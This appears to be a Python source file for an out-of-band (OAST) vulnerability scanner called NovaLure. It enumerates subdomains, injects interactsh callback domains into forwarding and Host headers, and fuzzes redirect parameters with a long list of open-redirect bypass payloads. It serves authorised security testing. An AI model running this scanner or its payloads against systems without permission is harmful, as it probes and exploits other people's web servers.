#!/usr/bin/env python3
import subprocess
import time
import re
import os
import json
import shlex
import argparse
from urllib.parse import urlparse, quote, parse_qs, urlencode, urlunparse 
from datetime import datetime
import requests

# --- Script Configuration ---
# Paths to external tools. Ensure they are in your system's PATH
# or modify these variables to provide full paths.
INTERACTSH_CLIENT_PATH = "interactsh-client"
ASSETFINDER_PATH = "assetfinder"
HTTPROBE_PATH = "httprobe"

# Default file names and settings
DEFAULT_REPORT_FILE = "NovaLure_Report.md"
DEFAULT_REQUEST_TIMEOUT = 10
DEFAULT_INTERACTSH_SERVER_FOR_CLIENT = "https://interact.sh"
# For interactive input, if user provides neither -i nor -u
DEFAULT_INPUT_PROMPT_MESSAGE = "[?] Enter a single domain (e.g., example.com) or path to a domain/URL list file: "


# --- Global Variables ---
interactsh_base_domain = None
interactsh_process = None
INTERACTSH_TEMP_HITS_FILE = "interactsh_temp_hits.json"
NOVALURE_PUBLIC_IP = None 

# ANSI Colors for console output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    CYAN = '\033[96m'

# Global verbosity flags, will be set by argparse
VERBOSE_MODE = False
QUIET_MODE = False

# Regex to strip ANSI escape codes from interactsh-client output
ANSI_ESCAPE_REGEX = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')

# Parameters commonly associated with SSRF or Open Redirects for GET requests
# User might want to customize or expand this list.
COMMON_TARGET_PARAMS = sorted(list(set([
    "url", "uri", "u", "src", "source", "dest", "destination", "redirect", "r", "redir",
    "image", "img", "img_url", "image_url", "file", "path", "page", "document",
    "feed", "data", "site", "host", "target", "next", "continue", "return", "goto",
    "return_to", "returnTo", "return_path", "returnUrl", "out", "view", "show", "load", "display", "content",
    "navigation", "open", "dir", "endpoint", "domain", "proxy", "callback", "redirect_uri",
    "href", "link", "val", "validate", "to", "from", "checkout_url", "errorUrl", "successUrl",
    "website", "web", "go", "URL", "link", "uri", "uri", "page", "page_url", "file_url", "img_src",
    "window", "ReturnUrl", "RedirectUrl", "next_url", "prev_url", "checkout", "logout", "login_url"
])))

# Open Redirect Payload Patterns - {{OAST_DOMAIN}} will be replaced
# User might want to customize or expand this list.
OPEN_REDIRECT_PAYLOAD_PATTERNS = [
    "{{OAST_DOMAIN}}", "//{{OAST_DOMAIN}}", "///{{OAST_DOMAIN}}",
    "https://{{OAST_DOMAIN}}", "http://{{OAST_DOMAIN}}",
    "https:{{OAST_DOMAIN}}", "http:{{OAST_DOMAIN}}",
    "//{{OAST_DOMAIN}}/", "///{{OAST_DOMAIN}}//", "https://{{OAST_DOMAIN}}/", "http://{{OAST_DOMAIN}}/",
    r"/\/{{OAST_DOMAIN}}",  
    "\\{{OAST_DOMAIN}}",    
    "\\\\{{OAST_DOMAIN}}",  
    "//{{OAST_DOMAIN}}%2f", "//{{OAST_DOMAIN}}%2F",
    "//{{OAST_DOMAIN}}%3Ftest", "//{{OAST_DOMAIN}}%23test",
    "//%09{{OAST_DOMAIN}}", "//%20{{OAST_DOMAIN}}",
    "//{{OAST_DOMAIN}}%09", "//{{OAST_DOMAIN}}%20",
    "//{{OAST_DOMAIN}}%00",
    "https://foo@{{OAST_DOMAIN}}/", "https://{{OAST_DOMAIN}}@bar.com/",
    "https://{{OAST_DOMAIN}}%252F.example.com", "https://{{OAST_DOMAIN}}%255C.example.com",
    "http://bing.com%252E{{OAST_DOMAIN}}",
    "/%0a/{{OAST_DOMAIN}}", "/%0d/{{OAST_DOMAIN}}",
    "/.{{OAST_DOMAIN}}", 
    "}};url=//{{OAST_DOMAIN}}",
    "?url=//{{OAST_DOMAIN}}", "#//{{OAST_DOMAIN}}",
    "//{{OAST_DOMAIN}}//google.com", "//google.com%2f%2e%2e%2f{{OAST_DOMAIN}}",
    "//google.com%2f..%2f{{OAST_DOMAIN}}", "///google.com/%2f%2f{{OAST_DOMAIN}}",
    "http://{{OAST_DOMAIN}}?.jpg", "http://{{OAST_DOMAIN}}%20?.jpg",
    "http://{{OAST_DOMAIN}}%0d%0aLocation:%20{{OAST_DOMAIN}}", # Primarily for header CRLF but can test in param
    "//{{OAST_DOMAIN}}%c0%af%c0%afgoogle.com", 
    "//{{OAST_DOMAIN}}%ef%bc%8f%ef%bc%8fgoogle.com", # Full-width slashes
    "/%2e%2e%2f%2f{{OAST_DOMAIN}}", "/%2e%2e/%2f%2f{{OAST_DOMAIN}}",
    "/%2f%2e%2e%2f%2f{{OAST_DOMAIN}}", "/{{OAST_DOMAIN}}", # Relative if base is attacker controlled
    "http://foo:bar@{{OAST_DOMAIN}}/",
    "//{{OAST_DOMAIN}}/%252e%252e%252f", # Double encoded ../
    "//{{OAST_DOMAIN}}/%252e%252e/",
    "//{{OAST_DOMAIN}}/%2e%2e/", 
    "//{{OAST_DOMAIN}}/%2E%2E%2F", # Uppercase encoded ../
    "//{{OAST_DOMAIN}}/%c0%ae%c0%ae/", # Overlong ../
    "//{{OAST_DOMAIN}}/%C0%AE%C0%AE%2F",
    " //{{OAST_DOMAIN}}", "\t//{{OAST_DOMAIN}}", "　//{{OAST_DOMAIN}}", # Ideographic space U+3000
]


def print_banner():
    if QUIET_MODE:
        return
    banner = f"""
 _______                      .____                          
 \      \   _______  _______  |    |    __ _________   ____  
 /   |   \ /  _ \  \/ /\__  \ |    |   |  |  \_  __ \_/ __ \ 
/    |    (  <_> )   /  / __ \|    |___|  |  /|  | \/\  ___/ 
\____|__  /\____/ \_/  (____  /_______ \____/ |__|    \___  >
        \/                  \/        \/                  \/ 
    {Colors.GREEN}OAST Scanner by Cyphernova1337{Colors.ENDC}
    Version 2.2.0 (Finalized Input & Flags)
"""
    print(banner)

def console_log(message, level="INFO"):
    """Prints message to console with appropriate formatting and colors."""
    if QUIET_MODE and level not in ["FATAL", "ERROR", "SUCCESS_IMPORTANT", "REPORT_INFO"]:
        return

    if VERBOSE_MODE:
        prefix = f"[{datetime.now().strftime('%H:%M:%S')}] [{level}] "
        color = ""
        if level == "SUCCESS" or level == "SUCCESS_IMPORTANT": color = Colors.GREEN
        elif level == "ERROR" or level == "FATAL": color = Colors.RED
        elif level == "WARN": color = Colors.YELLOW
        elif level == "DEBUG": color = Colors.BLUE 
        elif level == "EXEC": color = Colors.HEADER
        elif level == "INFO": color = Colors.CYAN
        
        if level == "DEBUG" and not VERBOSE_MODE:
             return
        print(f"{color}{prefix}{message}{Colors.ENDC if color else ''}")
    else: # Not verbose mode
        if level == "SUCCESS_IMPORTANT":
            print(f"{Colors.BOLD}{Colors.GREEN}[*] {message}{Colors.ENDC}")
        elif level == "SUCCESS":
            print(f"{Colors.GREEN}[+] {message}{Colors.ENDC}")
        elif level == "ERROR" or level == "FATAL":
            print(f"{Colors.RED}{Colors.BOLD}[!] {message}{Colors.ENDC}")
        elif level == "WARN":
            print(f"{Colors.YELLOW}[-] {message}{Colors.ENDC}")
        elif level == "INFO":
            print(f"{Colors.BLUE}[i] {message}{Colors.ENDC}")
        elif level == "EXEC":
             print(f"{Colors.HEADER}[>] {message}{Colors.ENDC}")
        elif level == "REPORT_INFO": 
             print(f"{Colors.CYAN}[R] {message}{Colors.ENDC}")
        # DEBUG messages are implicitly suppressed in non-verbose mode by the above logic

def get_public_ip():
    """Fetches the public IP of the machine running the script."""
    global NOVALURE_PUBLIC_IP
    ip_services = ['https://api.ipify.org?format=json', 'https://ipinfo.io/json', 'https://icanhazip.com']
    for service_url in ip_services:
        try:
            console_log(f"Attempting to fetch public IP from {service_url}...", level="DEBUG")
            response = requests.get(service_url, timeout=5)
            response.raise_for_status()
            if "ipify" in service_url or "ipinfo" in service_url: # These return JSON with an 'ip' key
                NOVALURE_PUBLIC_IP = response.json().get('ip')
            else: # icanhazip returns plain text IP
                NOVALURE_PUBLIC_IP = response.text.strip()
            
            if NOVALURE_PUBLIC_IP:
                console_log(f"NovaLure's public IP identified as: {NOVALURE_PUBLIC_IP}", level="INFO")
                return
        except Exception as e:
            console_log(f"Could not determine NovaLure's public IP from {service_url}: {e}", level="WARN")
    console_log("Failed to determine NovaLure's public IP from all services. Client-side hit verification might be affected.", level="WARN")

def start_interactsh_client(server_url):
    """Starts interactsh-client, captures its base domain."""
    global interactsh_base_domain, interactsh_process, INTERACTSH_TEMP_HITS_FILE

    if os.path.exists(INTERACTSH_TEMP_HITS_FILE):
        try:
            os.remove(INTERACTSH_TEMP_HITS_FILE)
        except OSError as e:
            console_log(f"Could not remove old temp hits file {INTERACTSH_TEMP_HITS_FILE}: {e}", level="WARN")


    console_log(f"Starting interactsh-client (Server: {server_url}, Output: {INTERACTSH_TEMP_HITS_FILE})...", level="INFO")
    command = (
        f"{INTERACTSH_CLIENT_PATH} -s {server_url} "
        f"-json -o {INTERACTSH_TEMP_HITS_FILE} -v -poll-interval 5"
    )
    
    try:
        interactsh_process = subprocess.Popen(
            shlex.split(command),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT, 
            text=True,
            bufsize=1, 
            universal_newlines=True
        )
    except FileNotFoundError:
        console_log(f"FATAL: interactsh-client not found. Searched at '{INTERACTSH_CLIENT_PATH}'. Please ensure it's installed and in your PATH, or update INTERACTSH_CLIENT_PATH in the script.", level="FATAL")
        return False

    domain_pattern = re.compile(
        r"^\[INF\]\s+([\w.-]+\.oast\.(?:fun|live|site|online|me|pro))$"
    )
    
    start_time = time.time()
    line_buffer = [] 

    for line in iter(interactsh_process.stdout.readline, ''):
        original_line_stripped = line.strip()
        line_for_regex = ANSI_ESCAPE_REGEX.sub('', original_line_stripped)
        
        line_buffer.append(original_line_stripped)
        if len(line_buffer) > 10: 
            line_buffer.pop(0)

        console_log(f"[INTERACTSH_SETUP_LINE] {original_line_stripped}", level="DEBUG") 
        if original_line_stripped != line_for_regex:
             console_log(f"[ANSI_CLEANED_LINE] '{line_for_regex}' (from: '{original_line_stripped}')", level="DEBUG")

        match = domain_pattern.search(line_for_regex) 

        if match:
            console_log(f"Regex match successful on cleaned line: '{line_for_regex}'", level="DEBUG")
            captured_domain = match.group(1) 
            if captured_domain: 
                interactsh_base_domain = captured_domain.strip()
                console_log(f"Captured Interactsh base domain: {interactsh_base_domain}", level="SUCCESS_IMPORTANT")
                return True 
            else:
                # This case should ideally not be hit if the regex is correct and matches
                console_log(f"Regex matched but capturing group 1 (domain) is empty. Match groups: {match.groups()}", level="WARN")
        else:
            # More specific warning if we see a line that looks like it has the domain but didn't match THIS specific regex
            if "[INF]" in line_for_regex and ".oast." in line_for_regex and not line_for_regex.startswith("[INF] Listing"): 
                 console_log(f"Line looked like OAST domain but specific regex didn't match cleaned line: '{line_for_regex}'", level="DEBUG")
                 console_log(f"    Original line (repr for hidden chars check): {repr(original_line_stripped)}", level="DEBUG")

        if time.time() - start_time > 25: 
            console_log("Timed out waiting for Interactsh domain from client output.", level="ERROR")
            console_log(f"Last few lines from interactsh-client before timeout: \n" + "\n".join(line_buffer), level="DEBUG")
            interactsh_process.terminate()
            return False
        
        process_poll_result = interactsh_process.poll()
        if process_poll_result is not None: 
            console_log(f"interactsh-client terminated unexpectedly during setup with code {process_poll_result}.", level="ERROR")
            console_log(f"Last few lines from interactsh-client before exit: \n" + "\n".join(line_buffer), level="DEBUG")
            remaining_output = interactsh_process.stdout.read() 
            if remaining_output:
                console_log(f"Remaining output from interactsh-client: \n{ANSI_ESCAPE_REGEX.sub('', remaining_output.strip())}", level="DEBUG")
            return False
            
    console_log("Interactsh client stdout stream ended before domain was found (loop finished).", level="ERROR")
    console_log(f"Last few lines from interactsh-client before stdout stream ended: \n" + "\n".join(line_buffer), level="DEBUG")
    if interactsh_process.poll() is None: 
        interactsh_process.terminate() 
    return False

def stop_interactsh_client():
    """Stops the interactsh-client process."""
    global interactsh_process
    if interactsh_process and interactsh_process.poll() is None:
        console_log("Stopping interactsh-client...", level="INFO")
        interactsh_process.terminate()
        try:
            interactsh_process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            interactsh_process.kill()
            console_log("interactsh-client forcefully killed after timeout.", level="WARN")
        console_log("interactsh-client stopped.", level="INFO")

def get_live_urls_from_file(input_file_path, skip_assetfinder=False, skip_httprobe=False):
    """Uses assetfinder and httprobe to get live URLs, or processes input directly."""
    console_log(f"Processing input from: {input_file_path}", level="INFO")
    live_urls = set() # Use a set to avoid duplicate URLs from different processing paths

    if not os.path.exists(input_file_path):
        console_log(f"Input file for processing not found: {input_file_path}", level="ERROR")
        return list(live_urls)

    if skip_assetfinder and skip_httprobe:
        console_log("Skipping recon. Assuming input file contains live URLs.", level="INFO")
        with open(input_file_path, "r") as f:
            for line in f:
                stripped_line = line.strip()
                if stripped_line.startswith(("http://", "https://")):
                    live_urls.add(stripped_line)
        console_log(f"Loaded {len(live_urls)} URLs directly from input file.")
        return list(live_urls)

    try:
        with open(input_file_path, "r") as f:
            domains_content = f.read()
        
        processed_subs = domains_content
        if not skip_assetfinder:
            assetfinder_cmd = f"{ASSETFINDER_PATH} --subs-only"
            console_log(f"Running assetfinder...", level="EXEC")
            p1 = subprocess.Popen(shlex.split(assetfinder_cmd), stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
            subs_out, err1 = p1.communicate(input=domains_content)
            if p1.returncode != 0:
                console_log(f"assetfinder failed. Stderr: {err1}", level="ERROR")
                return []
            num_subs = len(subs_out.splitlines())
            console_log(f"assetfinder found {num_subs} potential subdomains.", level="INFO" if num_subs > 0 else "WARN")
            processed_subs = subs_out
        else:
            console_log("Skipping assetfinder.", level="INFO")

        if not skip_httprobe:
            httprobe_cmd = f"{HTTPROBE_PATH} -c 50 -t 5000 -prefer-https"
            console_log(f"Running httprobe...", level="EXEC")
            p2 = subprocess.Popen(shlex.split(httprobe_cmd), stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
            urls_out, err2 = p2.communicate(input=processed_subs)
            if p2.returncode != 0:
                console_log(f"httprobe failed. Stderr: {err2}", level="ERROR")
                return []
            for url_item in urls_out.splitlines():
                if url_item.strip(): live_urls.add(url_item.strip())
            console_log(f"httprobe found {len(live_urls)} live URLs.", level="SUCCESS" if live_urls else "WARN")
        else: # httprobe skipped
            console_log("Skipping httprobe.", level="INFO")
            raw_urls = [line.strip() for line in processed_subs.splitlines() if line.strip()]
            for url_item in raw_urls:
                if not url_item.startswith(("http://", "https://")):
                    console_log(f"URL '{url_item}' missing protocol, attempting with https and http.", level="DEBUG")
                    # For direct testing, prefer https but requests will handle it.
                    # Add both to be sure if a server only responds on one without redirect.
                    live_urls.add(f"https://{url_item}") 
                    live_urls.add(f"http://{url_item}") 
                else:
                    live_urls.add(url_item)
            if raw_urls and not any(u.startswith("http") for u in raw_urls): 
                 console_log("Protocols were auto-prefixed as httprobe was skipped.",level="WARN")
    
    except FileNotFoundError as e:
        console_log(f"Tool not found: {e.filename}. Please ensure it's installed and in your PATH.", level="FATAL")
        return []
    except Exception as e:
        console_log(f"Exception in get_live_urls_from_file: {e}", level="ERROR")
    return list(live_urls)


def generate_oast_identifier(target_url_raw, method_tag_base, param_name=None, payload_type_tag=""):
    """Generates a unique identifier string for OAST payload, suitable for subdomains."""
    global interactsh_base_domain
    if not interactsh_base_domain: return None, None 
    
    parsed_target = urlparse(target_url_raw)
    target_host_sanitized = parsed_target.hostname.replace('.', '-') if parsed_target.hostname else "no-hostname"
    target_host_sanitized = re.sub(r'[^a-zA-Z0-9-]', '', target_host_sanitized)[:25].strip('-') 
    
    method_tag_sanitized = re.sub(r'[^a-zA-Z0-9-]', '', method_tag_base.lower())[:10]
    
    full_method_tag = method_tag_sanitized
    if param_name:
        param_name_sanitized = re.sub(r'[^a-zA-Z0-9-]', '', param_name.lower())[:10] 
        full_method_tag = f"{method_tag_sanitized}-{param_name_sanitized}"
    if payload_type_tag: 
        payload_type_sanitized = re.sub(r'[^a-zA-Z0-9-]', '', payload_type_tag.lower())[:7]
        full_method_tag = f"{full_method_tag}-{payload_type_sanitized}"

    timestamp_micro = str(int(time.time()*1000000)%100000) 
    unique_part = f"{full_method_tag}-{target_host_sanitized}-ts{timestamp_micro}"
    
    unique_part = unique_part[:60].strip('-') # Ensure label length is within DNS limits (max 63)
        
    full_oast_domain = f"{unique_part}.{interactsh_base_domain}"
    return full_oast_domain, unique_part

def _perform_request_and_analyze(test_info, target_url, req_timeout, headers=None, new_url_for_get=None, allow_redirects_setting=True):
    """Helper to make request and analyze for reflection/redirects."""
    try:
        url_to_fetch = new_url_for_get if new_url_for_get else target_url
        effective_headers = {"User-Agent": "NovaLure-OAST-Scanner/2.2.0"}
        if headers:
            effective_headers.update(headers)

        response = requests.get(url_to_fetch, headers=effective_headers, timeout=req_timeout, 
                                allow_redirects=allow_redirects_setting, verify=False)
        
        test_info["status_code"] = response.status_code

        if not allow_redirects_setting and response.status_code in [301, 302, 303, 307, 308] and response.headers.get("Location"):
            if test_info.get("oast_full_domain") and test_info["oast_full_domain"] in response.headers["Location"]:
                test_info["open_redirect_found"] = response.headers["Location"]
        
        if allow_redirects_setting:
            for r_hist in response.history: 
                if r_hist.status_code in [301, 302, 303, 307, 308] and r_hist.headers.get("Location"):
                    if test_info.get("oast_full_domain") and test_info["oast_full_domain"] in r_hist.headers["Location"]: 
                        test_info["open_redirect_found"] = r_hist.headers["Location"]; break
        
        if test_info.get("oast_full_domain") and test_info["oast_full_domain"] in response.text: 
            test_info["reflection_in_body"] = True
            
    except requests.exceptions.Timeout: test_info["errors"].append("Request timed out."); test_info["status_code"] = "Timeout"
    except requests.exceptions.RequestException as e: test_info["errors"].append(str(e)); test_info["status_code"] = "Request Error"
    except Exception as e: test_info["errors"].append(f"Unexpected error: {str(e)}"); test_info["status_code"] = "Unexpected Script Error"


def fuzz_get_parameters_for_open_redirect(target_url, req_timeout, common_params_list, payload_patterns_list):
    """Fuzzes GET parameters for open redirects using OAST payloads."""
    console_log(f"  Starting Open Redirect fuzzing for GET parameters on {target_url}", level="DEBUG")
    findings = []
    parsed_target_url = urlparse(target_url)
    original_query_params = parse_qs(parsed_target_url.query, keep_blank_values=True)

    params_to_fuzz = {name: values for name, values in original_query_params.items() if name.lower() in common_params_list}
    if not params_to_fuzz:
        console_log(f"  No common redirect parameters found in {target_url} for fuzzing.", level="DEBUG")
        return findings

    for param_name in params_to_fuzz:
        console_log(f"    Fuzzing parameter: '{param_name}' for Open Redirect", level="DEBUG")
        for i, payload_pattern in enumerate(payload_patterns_list):
            oast_full_domain, oast_unique_id = generate_oast_identifier(target_url, "ORP", param_name, payload_type_tag=f"p{i:02d}")
            if not oast_full_domain: continue

            crafted_payload_value = payload_pattern.replace("{{OAST_DOMAIN}}", oast_full_domain)
            
            current_test_info = {
                "method_tag": f"OR_PARAM_{param_name}", "oast_identifier": oast_unique_id, 
                "oast_full_domain": oast_full_domain, "sent_payload_value": crafted_payload_value, 
                "sent_payload_description": f"GET Param '{param_name}' fuzzed with: '{crafted_payload_value}'",
                "status_code": "Not Set", "reflection_in_body": False, 
                "open_redirect_found": None, "errors": [], "interactsh_hits": []
            }

            modified_params = original_query_params.copy()
            current_param_values = list(modified_params.get(param_name, [''])) 
            current_param_values[0] = crafted_payload_value 
            modified_params[param_name] = current_param_values

            new_query_string = urlencode(modified_params, doseq=True)
            fuzzed_url = urlunparse((parsed_target_url.scheme, parsed_target_url.netloc, parsed_target_url.path, parsed_target_url.params, new_query_string, parsed_target_url.fragment))
            
            console_log(f"      Testing OR Payload {i+1}: {fuzzed_url}", level="DEBUG")
            _perform_request_and_analyze(current_test_info, target_url, req_timeout, new_url_for_get=fuzzed_url, allow_redirects_setting=True)
            
            findings.append(current_test_info)
            time.sleep(0.05) 
    return findings


def test_url_for_oast(target_url, req_timeout, args_cli):
    """Sends various OAST payloads to the target URL and returns findings."""
    console_log(f"Target: {target_url}", level="DEBUG")
    url_findings = {"target": target_url, "tests": []}
    
    header_test_methods = {
        "M1_XFF": {"header": "X-Forwarded-For"}, "M2_XFH": {"header": "X-Forwarded-Host"},
        "M3_Host": {"header": "Host"}, "M4_ReqTarget": {"special": True}
    }

    for tag, details in header_test_methods.items():
        oast_full_domain, oast_unique_id = generate_oast_identifier(target_url, tag) 
        if not oast_full_domain:
            url_findings["tests"].append({"method_tag": tag, "errors": ["OAST URL generation failed"], "oast_identifier": oast_unique_id or "N/A", "oast_full_domain": oast_full_domain or "N/A", "sent_payload_description":"N/A", "status_code": "Setup Error", "interactsh_hits":[]})
            continue

        current_test_info = {
            "method_tag": tag, "oast_identifier": oast_unique_id, "oast_full_domain": oast_full_domain, 
            "sent_payload_value": oast_full_domain, "sent_payload_description": "", "status_code": "Not Set", 
            "reflection_in_body": False, "open_redirect_found": None, "errors": [], "interactsh_hits": []
        }

        try:
            if "header" in details:
                header_name = details["header"]
                headers = {header_name: oast_full_domain}
                current_test_info["sent_payload_description"] = f"Header '{header_name}: {oast_full_domain}'"
                console_log(f"  [{tag}] Sending: {current_test_info['sent_payload_description']}", level="DEBUG")
                _perform_request_and_analyze(current_test_info, target_url, req_timeout, headers=headers)
            
            elif tag == "M4_ReqTarget":
                target_for_m4_payload = f"http://{oast_full_domain}/M4_HIT_PATH_NOVALURE" 
                current_test_info["sent_payload_value"] = target_for_m4_payload
                current_test_info["sent_payload_description"] = f"Request-Target: {target_for_m4_payload}"
                console_log(f"  [{tag}] Sending: {current_test_info['sent_payload_description']}", level="DEBUG")
                status_code_from_curl = "M4_Status_Error" 
                try:
                    curl_m4_cmd = (f"curl -s -L --connect-timeout {int(req_timeout/2)} --max-time {req_timeout} "
                                   f"-H \"User-Agent: NovaLure-OAST-Scanner/2.2.0\" " 
                                   f"\"{target_url}\" --request-target \"{target_for_m4_payload}\" -o /dev/null -w \"%%{{http_code}}\"")
                    process_result = subprocess.run(shlex.split(curl_m4_cmd), capture_output=True, text=True, timeout=req_timeout + 2)
                    if process_result.stderr: current_test_info["errors"].append(f"curl stderr: {process_result.stderr.strip()}")
                    status_code_str = process_result.stdout.strip()
                    status_code_from_curl = int(status_code_str) if status_code_str.isdigit() and len(status_code_str) == 3 else (f"cURL_status: {status_code_str}" if status_code_str else "cURL_NoStatusOutput")
                except subprocess.TimeoutExpired: current_test_info["errors"].append("curl M4 timed out."); status_code_from_curl = "Timeout (curl M4)"
                except FileNotFoundError: current_test_info["errors"].append("curl not found for M4."); status_code_from_curl = "CurlNotFound (M4)"
                except Exception as sub_e: current_test_info["errors"].append(f"Curl M4 error: {sub_e}"); status_code_from_curl = "ErrorInCurlExec (M4)"
                current_test_info["status_code"] = status_code_from_curl
        
        except Exception as e: 
            current_test_info["errors"].append(f"Outer error in {tag}: {str(e)}")
            current_test_info["status_code"] = "Outer Script Error"
        
        if current_test_info["errors"]: current_test_info["errors"] = "; ".join(current_test_info["errors"])
        else: current_test_info["errors"] = None
        url_findings["tests"].append(current_test_info)
        time.sleep(0.05)

    if args_cli.test_open_redirects: # Check the flag here
        param_or_findings = fuzz_get_parameters_for_open_redirect(target_url, req_timeout, COMMON_TARGET_PARAMS, OPEN_REDIRECT_PAYLOAD_PATTERNS)
        if param_or_findings: 
            url_findings["tests"].extend(param_or_findings)
        
    return url_findings

def parse_and_correlate_interactsh_hits(all_tested_payloads_info):
    global INTERACTSH_TEMP_HITS_FILE, NOVALURE_PUBLIC_IP
    console_log(f"Parsing Interactsh hits from {INTERACTSH_TEMP_HITS_FILE}...", level="INFO")
    
    if not os.path.exists(INTERACTSH_TEMP_HITS_FILE):
        console_log(f"Interactsh hits file not found: {INTERACTSH_TEMP_HITS_FILE}", level="WARN")
        return all_tested_payloads_info

    processed_hits_count = 0; hits_data = []
    try:
        with open(INTERACTSH_TEMP_HITS_FILE, "r") as f:
            for line in f:
                if line.strip(): hits_data.append(json.loads(line.strip()))
    except Exception as e:
        console_log(f"Error reading/parsing Interactsh hits file {INTERACTSH_TEMP_HITS_FILE}: {e}", level="ERROR")
        return all_tested_payloads_info

    for hit in hits_data:
        hit_full_domain_interactsh = hit.get("full-id", hit.get("unique-id", "")) 
        if not hit_full_domain_interactsh: continue
        
        for url_payloads_info in all_tested_payloads_info:
            for test_info in url_payloads_info["tests"]:
                if test_info and hit_full_domain_interactsh == test_info.get("oast_full_domain"): 
                    hit_details = {
                        "protocol": hit.get("protocol"), "source_ip": hit.get("remote-address"),
                        "timestamp": hit.get("timestamp"),
                        "raw_request": hit.get("raw-request", None) if hit.get("protocol") == "http" else None,
                        "matched_oast_identifier": test_info.get("oast_identifier"),
                        "is_client_hit": True if NOVALURE_PUBLIC_IP and hit.get("remote-address") == NOVALURE_PUBLIC_IP else False
                    }
                    if test_info.get("interactsh_hits") is None: test_info["interactsh_hits"] = []
                    test_info["interactsh_hits"].append(hit_details)
                    processed_hits_count += 1
            
    console_log(f"Correlated {processed_hits_count} Interactsh hits.", level="SUCCESS_IMPORTANT" if processed_hits_count > 0 else "INFO")
    return all_tested_payloads_info

def generate_markdown_report(all_tests_results, report_file_path, scan_start_time, scan_end_time, args):
    console_log(f"Generating Markdown report: {report_file_path}", level="INFO")
    
    with open(report_file_path, "w") as f:
        f.write(f"# NovaLure OAST Scan Report\n\n")
        f.write(f"**NovaLure - OAST Scanner by Cyphernova1337**\n\n") 
        f.write(f"- **Scan Started:** {scan_start_time.strftime('%Y-%m-%d %H:%M:%S %Z')}\n")
        f.write(f"- **Scan Finished:** {scan_end_time.strftime('%Y-%m-%d %H:%M:%S %Z')}\n")
        f.write(f"- **Input Source:** `{args.actual_input_source}`\n") # Use the new attribute
        f.write(f"- **Interactsh Server Used by Client:** `{args.interactsh_server}`\n")
        if interactsh_base_domain: f.write(f"- **Interactsh Base Domain Captured:** `{interactsh_base_domain}`\n")
        if NOVALURE_PUBLIC_IP: f.write(f"- **Scanner Public IP:** `{NOVALURE_PUBLIC_IP}`\n")
        f.write(f"- **Strict Redirect Reporting (Header Injections):** `{'Enabled' if args.strict_redirects else 'Disabled - Showing Potentials'}`\n")
        f.write(f"- **Open Redirect Parameter Fuzzing:** `{'Enabled' if args.test_open_redirects else 'Disabled'}`\n")
        f.write("\n---\n\n")

        if not all_tests_results: f.write("## No URLs were tested or no results available.\n"); return

        f.write("## Scan Summary\n\n")
        total_targets_tested = len(all_tests_results)
        targets_with_server_oast_hits = 0; total_server_oast_interactions = 0
        targets_with_verified_or = 0
        
        for url_result in all_tests_results:
            url_had_server_oast_hit = False; url_had_verified_or_hit = False
            if url_result.get("tests"):
                for test in url_result["tests"]:
                    if test.get("interactsh_hits"):
                        if any(not hit.get("is_client_hit") for hit in test["interactsh_hits"]):
                            url_had_server_oast_hit = True
                            total_server_oast_interactions += sum(1 for hit in test["interactsh_hits"] if not hit.get("is_client_hit"))
                        if test.get("method_tag","").startswith("OR_PARAM_") and any(hit.get("protocol") == "http" for hit in test["interactsh_hits"]):
                            url_had_verified_or_hit = True
                        elif test.get("open_redirect_found") and any(hit.get("is_client_hit") and hit.get("protocol") == "http" for hit in test["interactsh_hits"]):
                            url_had_verified_or_hit = True
            if url_had_server_oast_hit: targets_with_server_oast_hits +=1
            if url_had_verified_or_hit: targets_with_verified_or +=1
        
        f.write(f"- **Total Targets Processed:** {total_targets_tested}\n")
        f.write(f"- **Targets with Server-Side OAST Interactions:** {targets_with_server_oast_hits}\n")
        f.write(f"- **Total Server-Side OAST Interactions Recorded:** {total_server_oast_interactions}\n")
        f.write(f"- **Targets with Verified Open Redirects (Any OAST Hit for OR tests):** {targets_with_verified_or}\n\n") # Clarified this line
        f.write("---\n\n")
        
        f.write("## Detailed Findings\n\n")
        if not any(url_result.get("tests") for url_result in all_tests_results):
             f.write("No specific test results to display.\n")

        for url_result in all_tests_results:
            f.write(f"### Target: `{url_result.get('target', 'N/A')}`\n\n")
            if not url_result.get("tests"):
                f.write("  - No tests performed or recorded for this target.\n\n"); continue

            has_any_finding_for_url = False
            for test in url_result["tests"]:
                is_verified_or_header = False
                if test.get("open_redirect_found") and test.get("interactsh_hits") and any(h.get("is_client_hit") and h.get("protocol")=="http" for h in test["interactsh_hits"]):
                    is_verified_or_header = True
                
                is_verified_or_param = False
                if test.get("method_tag","").startswith("OR_PARAM_") and test.get("interactsh_hits") and any(h.get("protocol")=="http" for h in test["interactsh_hits"]):
                    is_verified_or_param = True 

                report_this_test = False
                if test.get("reflection_in_body") or test.get("errors"): report_this_test = True
                if is_verified_or_header or is_verified_or_param: report_this_test = True
                if not args.strict_redirects and test.get("open_redirect_found") and not is_verified_or_header and not test.get("method_tag","").startswith("OR_PARAM_") : report_this_test = True
                if any(not hit.get("is_client_hit") for hit in test.get("interactsh_hits", [])): report_this_test = True

                if report_this_test:
                    has_any_finding_for_url = True
                    f.write(f"  - **Test Method:** `{test.get('method_tag','N/A')}`\n")
                    f.write(f"    - **Sent Payload Description:** `{test.get('sent_payload_description','N/A')}`\n")
                    f.write(f"    - **OAST Full Domain Sent:** `{test.get('oast_full_domain','N/A')}`\n")
                    f.write(f"    - **OAST Identifier:** `{test.get('oast_identifier','N/A')}`\n")
                    if test.get('status_code') is not None: f.write(f"    - **Response Status (Direct):** `{test['status_code']}`\n")
                    if test.get("reflection_in_body"): f.write(f"    - **Direct Reflection in Body:** `Yes`\n")
                    
                    if is_verified_or_param:
                        param_name_from_tag = test.get('method_tag','OR_PARAM_').split('OR_PARAM_')[-1]
                        f.write(f"    - **Verified Open Redirect (Parameter Fuzzing):** Payload `{test.get('sent_payload_value')}` in parameter `{param_name_from_tag}` led to OAST hit.\n")
                    elif is_verified_or_header:
                        f.write(f"    - **Verified Client-Side Open Redirect (Header):** Server redirected to `{test['open_redirect_found']}` (Confirmed by OAST hit from scanner's IP)\n")
